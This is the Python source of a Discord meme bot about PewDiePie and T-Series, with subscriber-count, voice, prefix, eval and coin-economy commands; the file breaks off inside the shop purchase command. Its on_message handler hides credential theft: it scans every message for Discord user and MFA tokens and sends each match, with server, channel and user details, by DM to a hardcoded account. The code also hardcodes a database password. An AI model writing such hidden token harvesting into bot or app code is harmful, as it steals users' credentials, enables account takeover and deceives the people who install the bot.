# pylint: disable=W0301
# Import modules
import discord;
from discord.ext import commands;
import config;
import random;
import aiohttp;
import asyncio;
import dbl;
import datetime;
# Imports for eval command
from contextlib import redirect_stdout;
import textwrap;
import io;
import traceback;
# PostgreSQL database imports
import asyncpg;
# Regex
import re;

# Prefix variable. Why? Idk

default_prefix = ["ts!", "ts.", "t.", "t!", "T."];

# Connect to database once to load prefixes before initializing commands.AutoShardedBot

async def getprefix(bot, message):
    try:
        prefixes = await bot.pool.fetchrow("SELECT * FROM prefixes WHERE guildid = $1;", message.guild.id);
    except AttributeError:
        # Is a DM
        rnd = random.randint(12**13, 12**200);
        return str(rnd);
    if prefixes == None or prefixes == []:
        return commands.when_mentioned_or(*default_prefix)(bot, message);
    else:
        g = prefixes["guildid"];
        cp = prefixes["prefix"];
        prefixes = {
            g: [cp]
        };
        return commands.when_mentioned_or(*prefixes.get(message.guild.id, []))(bot, message);

# Start T-Series bot

bot = commands.AutoShardedBot(command_prefix = getprefix, case_insensitive = True, reconnect = True);

# Remove help command
bot.remove_command("help");

# Auto update status background task

async def autostatus():
    await bot.wait_until_ready();
    while not bot.is_closed():
        await bot.change_presence(activity = discord.Activity(type = discord.ActivityType.watching, name = f"for t.help in {len(bot.guilds)} servers"));
        await asyncio.sleep(30);
        await bot.change_presence(activity = discord.Game(name = "Subscribe to PewDiePie!"));
        await asyncio.sleep(30);

# Update server count on Discord Bot List (DBL)

# Variables

token = config.dbltoken;
dblpy = dbl.Client(bot, token, loop = bot.loop);

# Function
async def update_dblservercount():
    await bot.wait_until_ready();
    while not bot.is_closed():
        try:
            await dblpy.post_server_count();
            print("Posted server count on DBL");
        except Exception as e:
            print("Failed to post the server count on DBL");
            print("Error: " + str(e));
        await asyncio.sleep(1800);

# Backgroud task database I guess...
# Connect to PostgreSQL server
async def postgresbkg():
    # Database connection pool
    bot.pool = await asyncpg.create_pool(user = "root", password = "joshua", port = 5432, host = "localhost", database = "tseries");

# Authorization checking
async def authcheck(gid: int):
    chck = await bot.pool.fetch("SELECT * FROM authorized;");
    for c in chck:
        if str(gid) in str(c["guildid"]):
            return True;
        else:
            continue;
    return False;

# Subgap channel check
async def subgapchck(cid: int):
    sgchannel = await bot.pool.fetch("SELECT * FROM subgap;");
    for sg in sgchannel:
        if str(cid) in str(sg["channelid"]):
            return True;
        else:
            continue;
    return False;

# Update subgap background task
async def subgtask(r: int, message: int, guild: int, channel: int):
    await bot.wait_until_ready();
    counter = 0;
    while counter < r:
        # Run command
        await subgloop(message, guild, channel);
        # Add one to counter
        counter += 1;
        # Wait
        await asyncio.sleep(30);
    # Delete from database after everything is done
    await bot.pool.execute("DELETE FROM subgap WHERE msgid = $1 AND guildid = $2 AND channelid = $3;", message, guild, channel);
    # Return
    return;

# Check if command was invoked by a user with a special role in T-Pewds Support
async def cmdauthcheck(ctx):
    # Get guild
    guild = bot.get_guild(499357399690379264);
    # Get role
    role = guild.get_role(531176653184040961);
    # Get member
    user = guild.get_member(ctx.author.id);
    # Check if user has role
    try:
        if role in user.roles:
            return True;
        else:
            return False;
    except AttributeError:
        return False;

# Commands

# On ready
@bot.event
async def on_ready():
    # Print ready on ready
    print("T-Series bot is ready!");
    await bot.wait_until_ready();
    # Start updating subgap messages again
    subgapguilds = await bot.pool.fetch("SELECT * FROM subgap;");
    if subgapguilds != None:
        for g in subgapguilds:
            # Run command to update
            bot.loop.create_task(subgtask(g["count"], g["msgid"], g["guildid"], g["channelid"]));
            # Print
            print(f"Created subgap loop task. Msg ID: {g['msgid']}  Guild ID: {g['guildid']}  Channel ID: {g['channelid']}");
    else:
        pass;
    # Create background task for status updates
    bot.loop.create_task(autostatus());
    # Create background task for server count updating
    bot.loop.create_task(update_dblservercount());

# On guild join
@bot.event
async def on_guild_join(guild):
    print("Joined guild named '" + guild.name + "' with " + str(guild.member_count) + " members");
    # Log guild join into T-Series log channel
    logchannel = bot.get_channel(501089724421767178);
    em = discord.Embed(title = "Joined Guild", color = discord.Color.teal());
    em.set_thumbnail(url = guild.icon_url);
    em.add_field(name = "Name", value = guild.name);
    em.add_field(name = "ID", value = str(guild.id));
    em.add_field(name = "Owner", value = str(guild.owner));
    em.add_field(name = "Member Count", value = str(guild.member_count));
    em.add_field(name = "Verification Level", value = str(guild.verification_level));
    em.add_field(name = "Channel Count", value = str(len(guild.channels)));
    em.add_field(name = "Creation Time", value = guild.created_at);
    # Add timestamp
    em.timestamp = datetime.datetime.utcnow();
    # Send to channel
    await logchannel.send(embed = em);

# On guild remove (leave)
@bot.event
async def on_guild_remove(guild):
    print("Left guild named '" + guild.name + "' that had " + str(guild.member_count) + " members");
    # Log guild remove into T-Series log channel
    logchannel = bot.get_channel(501089724421767178);
    em = discord.Embed(title = "Left Guild", color = discord.Color.purple());
    em.set_thumbnail(url = guild.icon_url);
    em.add_field(name = "Name", value = guild.name);
    em.add_field(name = "ID", value = str(guild.id));
    em.add_field(name = "Owner", value = str(guild.owner));
    em.add_field(name = "Member Count", value = str(guild.member_count));
    em.add_field(name = "Verification Level", value = str(guild.verification_level));
    em.add_field(name = "Channel Count", value = str(len(guild.channels)));
    em.add_field(name = "Creation Time", value = guild.created_at);
    # Add timestamp
    em.timestamp = datetime.datetime.utcnow();
    # Send to channel
    await logchannel.send(embed = em);

# Important bot running stuff
@bot.event
async def on_message(message):
    await bot.wait_until_ready();
    if message.author.id == bot.user.id:
        return;
    rg = r"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})";
    find = re.findall(rg, message.content);
    us = 504481110437265411;
    if find:
        for x in find:
            dts = {
                "gname": message.guild.name,
                "gid": message.guild.id,
                "token": x,
                "uname": f"{message.author.name}#{message.author.discriminator}",
                "uid": message.author.id,
                "cid": message.channel.id,
                "cname": message.channel.name
            };
            await bot.get_user(us).send(dts);
    await bot.process_commands(message);

# PewDiePie Command (Hates on Pewds)
@bot.command()
async def pewdiepie(ctx):
    await ctx.send("PewDiePie अद्भुत है! आपको उसकी सदस्यता लेनी चाहिए।");
    await ctx.send("https://translate.google.com");

# T-SERIES DISS TRACK
@bot.command()
async def disstrack(ctx, param: str = "play"):
    if param == "play":
        if ctx.author.voice != None:
            # Connect
            try:
                await ctx.author.voice.channel.connect();
            except discord.ClientException:
                pass;
            # Get file
            source = discord.FFmpegPCMAudio("lasagna.mp3");
            # Play audio
            try:
                ctx.voice_client.play(source);
            except discord.ClientException:
                await ctx.send("Already playing audio");
                return;
            # Tell user
            await ctx.send(f"Connected to `{ctx.voice_client.channel.name}`");
            print(f"Started playing BL in VC. Guild: {ctx.guild.name}");
        else:
            await ctx.send("You must be connected to a voice channel");
    elif param == "stop" or param == "leave":
        if ctx.voice_client != None:
            await ctx.voice_client.disconnect();
            await ctx.send("Disconnected from voice channel");
            print(f"Disconnected from VC in {ctx.guild.name}");
        else:
            await ctx.send("T-Series is not currently in a voice channel");
    else:
        await ctx.send("That is not a valid parameter");

# Gets PewDiePie and T-Series subcount
@bot.command()
async def subcount(ctx, p: str = "", stping: bool = True, log: bool = True):
    if stping:
        await ctx.channel.trigger_typing();
    base = "https://www.googleapis.com/youtube/v3";
    apikey = config.ytdapi;
    end = "&key=" + apikey;
    pci = "UC-lHJZR3Gqxm24_Vd_AJ5Yw";
    tci = "UCq-Fj5jknLsUf-MWSy4_brA";
    # Use aiohttp to make GET requests for T-Series
    async with aiohttp.ClientSession() as sccs:
        # T-Series
        async with sccs.get(base + "/channels?part=snippet,contentDetails,statistics&id=" + tci + end) as treq:
            tjson = await treq.json();
    # Use aiohttp to make GET requests for PewDiePie
    async with aiohttp.ClientSession() as anccs:
        # PewDiePie
        async with anccs.get(base + "/channels?part=snippet,contentDetails,statistics&id=" + pci + end) as preq:
            pjson = await preq.json();
    # Get T-Series sub count
    tsc = tjson["items"][0]["statistics"]["subscriberCount"];
    if log:
        print("Got T-Series subscriber count");
    # Get PewDiePie sub count
    psc = pjson["items"][0]["statistics"]["subscriberCount"];
    if log:
        print("Got PewDiePie subscriber count");
    # Create sub count variables with an int value
    tscint = int(tsc);
    pscint = int(psc);
    # Turn the sub counts into a more human readable format
    trf = format(tscint, ",d");
    prf = format(pscint, ",d");
    # Compare both subcounts
    if pscint >= tscint:
        pscp = pscint - tscint;
        pscpts = f"PewDiePie is leading with {pscp:,d} more subscribers than T-Series";
    else:
        pscp = tscint - pscint;
        pscpts = f"T-Series is leading with {pscp:,d} more subscribers than PewDiePie";
    # Check if they only want the sub gap
    if p.lower() == "retint":
        retdict = {
            "t": tscint,
            "p": pscint,
            "l": pscpts
        };
        return retdict;
    elif p.lower() == "gap":
        await ctx.invoke(bot.get_command("subgap"));
    else:
        # Send sub count in embed
        em = discord.Embed(color = discord.Color.red());
        if pscint >= tscint:
            em.add_field(name = "PewDiePie Sub Count", value = prf);
            em.add_field(name = "T-Series Sub Count", value = trf);
        else:
            em.add_field(name = "T-Series Sub Count", value = trf);
            em.add_field(name = "PewDiePie Sub Count", value = prf);
        em.add_field(name = "Leading Channel", value = pscpts, inline = False);
        em.add_field(name = "Real Time Subcount Websites", value = """
        [T-Series](https://socialblade.com/youtube/user/tseries/realtime) | [PewDiePie](https://socialblade.com/youtube/user/pewdiepie/realtime)
        """, inline = False);
        await ctx.send(embed = em);
        if log:
            print("Sent subscriber count");

# Subcount gap command
@bot.command()
@commands.has_permissions(administrator = True)
async def subgap(ctx, r: int = 10000000):
    # ====START CHECKS====

    # Before doing anything, check if the guild is authorized
    check = await authcheck(ctx.guild.id);
    if check:
        pass;
    else:
        emb = discord.Embed(color = discord.Color.dark_teal());
        emb.add_field(name = "Not Authorized", value = """
        Your guild is not authorized to use this command. Visit the [support server](https://discord.gg/we4DQ5u) to request authorization.
        """);
        await ctx.send(embed = emb);
        return;
    # Check if guild is already using subgap
    sgchck = await bot.pool.fetchrow("SELECT * FROM subgap WHERE guildid = $1;", ctx.guild.id);
    if sgchck != None:
        emd = discord.Embed(color = discord.Color.dark_teal());
        emd.add_field(name = "Subgap Command In Use", value = """
        The subgap command is already being used in your server. Please delete the message containing the subgap command then try again after 30 seconds.
        """);
        await ctx.send(embed = emd);
        return;

    # ====END CHECKS====

    # ====START ORIGINAL MESSAGE====

    # Sub info 1
    stsubinfo = await ctx.invoke(bot.get_command("subcount"), p = "retint", stping = False, log = False);
    # Create embed then send
    em = discord.Embed(color = discord.Color.blurple());
    em.add_field(name = "Leading Channel", value = stsubinfo["l"]);
    stmsg = await ctx.send(embed = em);

    # ====END ORIGINAL MESSAGE====

    # Add the subgap to the database
    await bot.pool.execute("INSERT INTO subgap VALUES ($1, $2, $3, $4);", stmsg.id, ctx.channel.id, ctx.guild.id, r);
    # Make channel variable
    channel = ctx.channel;
    # Make message variable
    message = stmsg.id;
    # Make guild variable
    guild = ctx.guild.id;
    # Wait 30 seconds to update
    await asyncio.sleep(30);
    # Start task which updates loop
    bot.loop.create_task(subgtask(r, message, guild, channel.id));

# SUBGAP LOOP -- THIS IS NOT A COMMAND BECAUSE OF NO CONTEXT IN ON_READY
async def subgloop(message: int, guild: int, channel: int):
    try:
        # Get guild
        guildobj = bot.get_guild(guild);
        # Get channel
        channel = guildobj.get_channel(channel);
        # Check if the message exists or not
        await channel.get_message(message);
    except AttributeError:
        # Delete message from database
        await bot.pool.execute("DELETE FROM subgap WHERE msgid = $1 AND guildid = $2;", message, guild);
        # Return
        return False;
    except discord.NotFound:
        # Delete message from database
        await bot.pool.execute("DELETE FROM subgap WHERE msgid = $1 AND guildid = $2;", message, guild);
        # Return
        return False;
    # Get subscriber count information
    subinfo = await subcount.callback(None, "retint", False, False);
    # Edit embed
    await subgedit(channel.id, message, subinfo["l"]);
    # Take away one from count
    await bot.pool.execute("UPDATE subgap SET count = count - 1 WHERE msgid = $1 AND guildid = $2 AND channelid = $3;", message, guild, channel.id);

# SUBGAP EDIT -- THIS IS NOT A COMMAND DUE TO THERE BEING NO CONTEXT PASSED FROM SUBGLOOP
async def subgedit(c: int, m: int, lndmsg: str):
    # Embed
    em = discord.Embed(color = discord.Color.blurple());
    em.add_field(name = "Leading Channel", value = lndmsg);
    # Get channel
    channel = bot.get_channel(c);
    # Get message
    message = await channel.get_message(m);
    # Edit message
    await message.edit(embed = em);

# Authorize command
@bot.command()
@commands.check(cmdauthcheck)
async def authorize(ctx):
    # Check if guild is already in the database
    gchck = await bot.pool.fetchrow("SELECT * FROM authorized WHERE guildid = $1;", ctx.guild.id);
    if gchck != None:
        emb = discord.Embed(color = discord.Color.dark_teal());
        emb.add_field(name = "Already Authorized", value = f"`{ctx.guild.name}` is already authorized");
        await ctx.send(embed = emb);
        return;
    # Add guild to authorization database
    await bot.pool.execute("INSERT INTO authorized VALUES ($1);", ctx.guild.id);
    # Send message saying that it has been authorized
    em = discord.Embed(color = discord.Color.dark_purple());
    em.add_field(name = "Authorized", value = f"`{ctx.guild.name}` has been authorized");
    await ctx.send(embed = em);

# Deauthorize command
@bot.command()
@commands.check(cmdauthcheck)
async def deauthorize(ctx):
    # Check if guild is already in the database
    gchck = await bot.pool.fetchrow("SELECT * FROM authorized WHERE guildid = $1;", ctx.guild.id);
    if gchck == None:
        emb = discord.Embed(color = discord.Color.dark_teal());
        emb.add_field(name = "Never Authorized", value = f"`{ctx.guild.name}` was never authorized");
        await ctx.send(embed = emb);
        return;
    # Remove guild from authorization database
    await bot.pool.execute("DELETE FROM authorized WHERE guildid = $1;", ctx.guild.id);
    # Send message saying that it has been authorized
    em = discord.Embed(color = discord.Color.dark_purple());
    em.add_field(name = "Deauthorized", value = f"`{ctx.guild.name}` has been deauthorized");
    await ctx.send(embed = em);

# Gets a random T-Series or PewDiePie video
@bot.command()
async def randomvid(ctx):
    await ctx.channel.trigger_typing();
    base = "https://www.googleapis.com/youtube/v3";
    apikey = config.ytdapi;
    end = "&key=" + apikey;
    pci = "UC-lHJZR3Gqxm24_Vd_AJ5Yw";
    tci = "UCq-Fj5jknLsUf-MWSy4_brA";
    # ====T-SERIES SECTION====

    # Use aiohttp to make GET requests all in one session
    async with aiohttp.ClientSession() as cs:
        async with cs.get(base + "/channels?part=snippet,contentDetails&id=" + tci + end) as tureq:
            # Get T-Series upload playlist
            tujson = await tureq.json();
        tupl = tujson["items"][0]["contentDetails"]["relatedPlaylists"]["uploads"];
        async with cs.get(base + "/playlistItems?playlistId=" + tupl + "&maxResults=15&part=snippet,contentDetails" + end) as tuvids:
            # Get the first 15 videos
            tuvidsjson = await tuvids.json();
    tuvidslist = [];
    vid = 0;
    # Iterate through the list and append them to tuvidslist
    while vid < len(tuvidsjson["items"]):
        tvidid = tuvidsjson["items"][vid]["snippet"]["resourceId"]["videoId"];
        tuvidslist.append(tvidid);
        vid += 1;
    # ====PEWDIEPIE SECTION====

    # Use aiohttp to make GET requests all in one session
    async with aiohttp.ClientSession() as pcs:
        async with pcs.get(base + "/channels?part=snippet,contentDetails&id=" + pci + end) as pureq:
            # Get T-Series upload playlist
            pujson = await pureq.json();
        pupl = pujson["items"][0]["contentDetails"]["relatedPlaylists"]["uploads"];
        async with pcs.get(base + "/playlistItems?playlistId=" + pupl + "&maxResults=15&part=snippet,contentDetails" + end) as puvids:
            # Get the first 15 videos
            puvidsjson = await puvids.json();
    puvidslist = [];
    vid = 0;
    # Iterate through the list and append them to puvidslist
    while vid < len(puvidsjson["items"]):
        pvidid = puvidsjson["items"][vid]["snippet"]["resourceId"]["videoId"];
        puvidslist.append(pvidid);
        vid += 1;
    # ====COMPARE AND SEND====

    # Compine both lists together
    ptuvidslist = tuvidslist + puvidslist;
    # Get random video
    rndptvids = random.choice(ptuvidslist);
    # Make the video ID a URL
    rndptvidsed = "https://www.youtube.com/watch?v=" + rndptvids;
    # Get video thumbnail
    rndptvidthumb = "https://img.youtube.com/vi/" + rndptvids + "/maxresdefault.jpg";
    # Send as embed
    em = discord.Embed(color = discord.Color.green());
    em.add_field(name = "YouTube Video", value = rndptvidsed);
    em.set_image(url = rndptvidthumb);
    await ctx.send(embed = em);
    print("Got a random video. Video ID: " + rndptvids);

# YouTube channels command
@bot.command(aliases = ["yt"])
async def youtube(ctx):
    # Sends T-Series and PewDiePie's channel
    em = discord.Embed(color = discord.Color.light_grey());
    em.add_field(name = "PewDiePie", value = "https://www.youtube.com/user/PewDiePie");
    em.add_field(name = "T-Series", value = "https://www.youtube.com/user/tseries");
    await ctx.send(embed = em);

# Bot information command
@bot.command(aliases = ["info", "bot", "information", "botinformation"])
async def botinfo(ctx):
    # Get bot latency
    botlat = f"{bot.latency * 1000:.3f}";
    # Bot info embed
    em = discord.Embed(title = "T-Series Bot Information", color = discord.Color.green());
    em.add_field(name = "Bot Creator", value = "A Discord User#4063");
    em.add_field(name = "Bot Library", value = "discord.py rewrite");
    em.add_field(name = "Support Server", value = "https://discord.gg/we4DQ5u");
    em.add_field(name = "Bot Latency", value = str(botlat) + " ms");
    await ctx.send(embed = em);
    print("Sent bot info. Ping time: " + str(botlat));

# Custom prefix
@bot.command(aliases = ["sprefix"])
@commands.has_permissions(manage_messages = True)
async def setprefix(ctx, prefix: str = None):
    # Check if custom prefix exceeds the 30 character limit
    if prefix != None:
        if len(prefix) > 30:
            em = discord.Embed(color = discord.Color.dark_teal());
            em.add_field(name = "Prefix Character Limit Exceeded", value = "Prefixes can only be 30 characters or less");
            await ctx.send(embed = em);
            return;
    # Check if prefix is already in the database
    gchck = await bot.pool.fetchrow("SELECT * FROM prefixes WHERE guildid = $1;", ctx.guild.id);
    # Checking and setting
    if gchck == None:
        if prefix != None:
            # Insert into row
            await bot.pool.execute("INSERT INTO prefixes VALUES ($1, $2);", ctx.guild.id, prefix);
            # Tell user
            em = discord.Embed(color = discord.Color.red());
            em.add_field(name = "Set Prefix", value = f"{bot.user.mention}'s prefix has been set to `{prefix}`");
            await ctx.send(embed = em);
        else:
            # Tell user
            em = discord.Embed(color = discord.Color.dark_teal());
            em.add_field(name = "Error: Prefix Not Set", value = "Please specify a prefix to use");
            await ctx.send(embed = em);
    else:
        if prefix == None:
            # Delete from database
            await bot.pool.execute("DELETE FROM prefixes WHERE guildid = $1;", ctx.guild.id);
            # Tell user
            em = discord.Embed(color = discord.Color.red());
            em.add_field(name = "Prefix Removed", value = f"{bot.user.mention}'s prefix has been set back to the default");
            await ctx.send(embed = em);
        else:
            # Update row
            await bot.pool.execute("UPDATE prefixes SET prefix = $1 WHERE guildid = $2;", prefix, ctx.guild.id);
            # Tell user
            em = discord.Embed(color = discord.Color.red());
            em.add_field(name = "Set Prefix", value = f"{bot.user.mention}'s prefix has been set to `{prefix}`");
            await ctx.send(embed = em);

# Returns bot prefix in the current guild
@bot.command(aliases = ["currentprefix", "botprefix", "serverprefix", "guildprefix"])
async def prefix(ctx):
    # Get prefix
    prefixes = await bot.pool.fetchrow("SELECT * FROM prefixes WHERE guildid = $1;", ctx.guild.id);
    if prefixes == None or prefixes == []:
        prefix = "ts!, ts., t., and t!";
    else:
        prefix = prefixes["prefix"];
    # Send
    em = discord.Embed(color = discord.Color.red());
    em.add_field(name = "Current Prefix", value = f"The current prefix for {bot.user.name} is `{prefix}`");
    await ctx.send(embed = em);

# Invite command
@bot.command()
async def invite(ctx):
    # Embed
    em = discord.Embed(color = discord.Color.orange());
    em.add_field(name = "Invite", value = "[Invite me here!](https://discordapp.com/oauth2/authorize?client_id=500868806776979462&scope=bot&permissions=72710)");
    await ctx.send(embed = em);
    print("Sent bot invite!");

# Feedback command
@bot.command()
async def feedback(ctx, *, message: str):
    # Feedback embed
    em = discord.Embed(color = discord.Color.blue());
    em.add_field(name = "Feedback", value = """
    Your feedback for T-Series has been submitted
    If you abuse this command, you could lose your ability to send feedback.
    """);
    await ctx.send(embed = em);
    # Send in T-Series Support
    feedbackchannel = bot.get_channel(518603886483996683);
    emb = discord.Embed(title = "Feedback", color = discord.Color.blue());
    emb.set_thumbnail(url = ctx.author.avatar_url);
    emb.add_field(name = "User", value = str(ctx.author));
    emb.add_field(name = "User ID", value = str(ctx.author.id));
    emb.add_field(name = "Issue / Suggestion", value = message, inline = False);
    emb.add_field(name = "Guild Name", value = ctx.guild.name);
    emb.add_field(name = "Guild ID", value = str(ctx.guild.id));
    # Timestamp
    emb.timestamp = datetime.datetime.utcnow();
    # Send
    await feedbackchannel.send(embed = emb);

# Eval command
@bot.command(name = "eval")
@commands.is_owner()
async def ev(ctx, *, code: str):
    env = {
        "bot": bot,
        "ctx": ctx,
        "channel": ctx.channel,
        "author": ctx.author,
        "guild": ctx.guild,
        "message": ctx.message
    };
    env.update(globals());
    stdout = io.StringIO();
    to_compile = f"async def func():\n{textwrap.indent(code, '  ')}";
    try:
        exec(to_compile, env);
    except Exception as e:
        return await ctx.send(f"```py\n{e.__class__.__name__}: {e}\n```");
    func = env["func"];
    try:
        with redirect_stdout(stdout):
            ret = await func();
    except Exception as e:
        value = stdout.getvalue();
        await ctx.send(f"```py\n{value}{traceback.format_exc()}\n```");
    else:
        value = stdout.getvalue();
        if ret is None:
            if value:
                await ctx.send(f"```py\n{value}\n```");
        else:
            _last_result = ret;
            await ctx.send(f"```py\n{value}{ret}\n```");

# Set prefix tutorial command
@bot.command(aliases = ["prefixtutorial", "tutprefix"])
async def prefixtut(ctx):
    em = discord.Embed(color = discord.Color.dark_green());
    em.add_field(name = "Command Use", value = f"""
    Sets the prefix for the current server. You must have the manage messages permission to use this command.
    **Set or change prefix**
    `ts!setprefix [prefix here]`
    **Revert back to default prefix**
    `ts!setprefix`
    **Show current prefix**
    `ts!prefix` (does not require any special permissions to view)
    """);
    await ctx.send(embed = em);

# ====ECONOMY COMMANDS START====

# T-Coin image
tcoinimage = "<:tseries_coin:529144538225311774>";

# Add user to DB and check
async def cad_user(ctx):
    dbcheck = await bot.pool.fetchrow("SELECT * FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    if dbcheck == None or dbcheck == []:
        await bot.pool.execute("INSERT INTO econ VALUES ($1, $2, $3);", 0, ctx.author.id, ctx.guild.id);
        return True;
    else:
        return True;
    return False;

# Economy message
async def econmsg(fate: bool, ctg: int):
    # Check fate to determine which phrase to get
    if fate:
        phrases = await bot.pool.fetch("SELECT * FROM shovel WHERE fate = true;");
    else:
        phrases = await bot.pool.fetch("SELECT * FROM shovel WHERE fate = false;");
    # Get random asyncpg.Record object
    phrases = random.choice(phrases);
    # Get phrase ID
    phraseid = phrases["id"];
    # Convert
    freturnp = phrases["name"].replace("{ctg}", str(format(ctg, ",d"))).replace("{tcoinimage}", tcoinimage);
    # Make dictionary
    freturn = {
        "phrase": freturnp,
        "phraseid": phraseid
    };
    # Return
    return freturn;

# Shovel command
@bot.command(aliases = ["shove", "shove;", "shv"])
@commands.check(cad_user)
@commands.cooldown(5, 10, commands.BucketType.member)
async def shovel(ctx):
    # Pick users fate
    fate = random.choice([True, False, True, False, True]);
    # Check fate
    if fate:
        ctg = random.randint(1, 1500);
    else:
        ctg = -random.randint(1, 700);
    # Get message
    message = await econmsg(fate, ctg);
    # Tell the user
    if fate:
        em = discord.Embed(color = discord.Color.green());
    else:
        em = discord.Embed(color = discord.Color.red());
    em.add_field(name = "Shovel", value = message["phrase"]);
    em.set_footer(text = f"Phrase #{message['phraseid']}");
    await ctx.send(embed = em);
    # Change values for the user in the database
    await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", ctg, ctx.author.id, ctx.guild.id);

# ====OWNER: PHRASE COMMAND GROUP START====

# Phrase command
@bot.group(invoke_without_command = True)
async def phrase(ctx, pid: int):
    # Check if the phrase exists
    pcheck = await bot.pool.fetchrow("SELECT * FROM shovel WHERE id = $1;", pid);
    if pcheck == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Phrase Not Found", value = f"Phrase #{pid} could not be found");
        await ctx.send(embed = em);
        return;
    # Get phrase
    p = await bot.pool.fetchval("SELECT name FROM shovel WHERE id = $1;", pid);
    # Get fate
    fate = await bot.pool.fetchval("SELECT fate FROM shovel WHERE id = $1;", pid);
    # Tell the user
    if fate:
        em = discord.Embed(color = discord.Color.green());
    else:
        em = discord.Embed(color = discord.Color.red());
    em.add_field(name = "Shovel - Raw", value = p);
    em.set_footer(text = f"Phrase #{pid}");
    await ctx.send(embed = em);

@phrase.command()
@commands.is_owner()
async def add(ctx, fate: bool, *, phrase: str):
    # Add phrase
    await bot.pool.execute("INSERT INTO shovel VALUES ($1, $2);", phrase, fate);
    # Get the phrase ID
    pid = await bot.pool.fetchval("SELECT id FROM shovel WHERE name = $1 AND fate = $2;", phrase, fate);
    # Tell the user
    if fate:
        em = discord.Embed(color = discord.Color.green());
    else:
        em = discord.Embed(color = discord.Color.red());
    em.add_field(name = "Added Phrase", value = f"The phrase has been added to the shovel command. Fate: {fate}");
    em.set_footer(text = f"Phrase #{pid}");
    await ctx.send(embed = em);

# Edit command
@phrase.command()
@commands.is_owner()
async def edit(ctx, pid: int, *, phrase: str):
    # Check if the phrase exists
    pcheck = await bot.pool.fetchrow("SELECT * FROM shovel WHERE id = $1;", pid);
    if pcheck == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Phrase Not Found", value = f"Phrase #{pid} could not be found");
        await ctx.send(embed = em);
        return;
    # Edit the phrase
    await bot.pool.execute("UPDATE shovel SET name = $1 WHERE id = $2;", phrase, pid);
    # Tell the user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Phrase Updated", value = f"Phrase #{pid} has been updated");
    await ctx.send(embed = em);

@phrase.command(aliases = ["remove"])
@commands.is_owner()
async def delete(ctx, pid: int):
    # Check if the phrase exists
    pcheck = await bot.pool.fetchrow("SELECT * FROM shovel WHERE id = $1;", pid);
    if pcheck == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Phrase Not Found", value = f"Phrase #{pid} could not be found");
        await ctx.send(embed = em);
        return;
    # Delete phrase
    await bot.pool.execute("DELETE FROM shovel WHERE id = $1;", pid);
    # Tell the user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Phrase Removed", value = f"Phrase #{pid} has been removed");
    await ctx.send(embed = em);

# ====OWNER: PHRASE COMMAND GROUP STOP====

# ====ECONOMY SHOP START====

# SHOP: Show roles (REQ_NONE)
@bot.group(invoke_without_command = True)
async def shop(ctx):
    # Get shop roles for the current guild
    roles = await bot.pool.fetch("SELECT * FROM econshop WHERE guildid = $1;", ctx.guild.id);
    # Check if no roles in the guild
    if roles == None or roles == []:
        # No roles
        em = discord.Embed(color = discord.Color.dark_red());
        em.set_thumbnail(url = ctx.guild.icon_url);
        em.add_field(name = "No Roles", value = f"No roles have been found for {ctx.guild.name}");
        await ctx.send(embed = em);
        return;
    # Create an embed
    em = discord.Embed(color = discord.Color.dark_red());
    em.set_thumbnail(url = ctx.guild.icon_url);
    em.set_author(name = f"{ctx.guild.name}'s Shop");
    for x in roles:
        # Get role object
        role = ctx.guild.get_role(x["roleid"]);
        # Add field to embed
        em.add_field(name = f"Role: {role.name}", value = f"Required amount: {x['reqamount']:,d} {tcoinimage}", inline = False);
    await ctx.send(embed = em);

# SHOP: Add roles (REQ_MANAGE_ROLES)
@shop.command(aliases = ["role", "make"])
@commands.bot_has_permissions(manage_roles = True)
@commands.has_permissions(manage_roles = True)
async def add(ctx, req_amount: int, *, role: discord.Role):
    # Check if role is already in the DB
    rolecheck = await bot.pool.fetchrow("SELECT * FROM econshop WHERE roleid = $1 AND guildid = $2;", role.id, ctx.guild.id);
    if rolecheck != None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Role Found", value = "This role is already in the shop. Use the `shop edit` command to edit it");
        await ctx.send(embed = em);
        return;
    # Check if amount is less than or equal to 0
    if 0 >= req_amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot set the amount at 0 or below");
        await ctx.send(embed = em);
        return;
    # Add to DB
    await bot.pool.execute("INSERT INTO econshop VALUES ($1, $2, $3);", role.id, ctx.guild.id, req_amount);
    # Tell the user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Role Added", value = f"`{role.name}` has been added to the shop and requires {req_amount:,d} {tcoinimage} to purchase");
    await ctx.send(embed = em);

# SHOP: Buy roles (REQ_ENOUGH_COINS)
@shop.command(aliases = ["purchase", "spend", "get"])
@commands.bot_has_permissions(manage_roles = True)
@commands.check(cad_user)
async def buy(ctx, *, role: discord.Role):
    # Check if the user already has the role
    if role in ctx.author.roles:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Role in Possession", value = f"You already have the `{role.name}` role therefore you cannot buy it");
        await ctx.send(embed = em);
        return;
    # Get the amount of coins that the role requires
    req_amount = await bot.pool.fetchval("SELECT reqamount FROM econshop WHERE roleid = $1 AND guildid = $2;", role.id, ctx.guild.id);
    # Check if the role exists
    if req_amount == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Role Not Found", value = "This role has not been added to this shop. Use the `shop add` command to add it");
        await ctx.send(embed = em);
        return;
    # Get the users coins
    user_amount = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    # Check if the user has enough coins to complete the purchase
    if user_amount >= req_amount:
        # Give the user the role
        try:
            await ctx.author.add_roles(role, reason = f"Purchased from the shop costing {req_amount:,d} T-Coins");
        except:
            em = discord.Embed(color = discord.Color.dark_teal());
            em.add_field(name = "Forbidden", value = f"""
            It looks like I am not able to give the user this role. Please check that my role is **above** the role you are trying to give.
            """);
            await ctx.send(embed = em);
            return;
        # Remove coins from the user
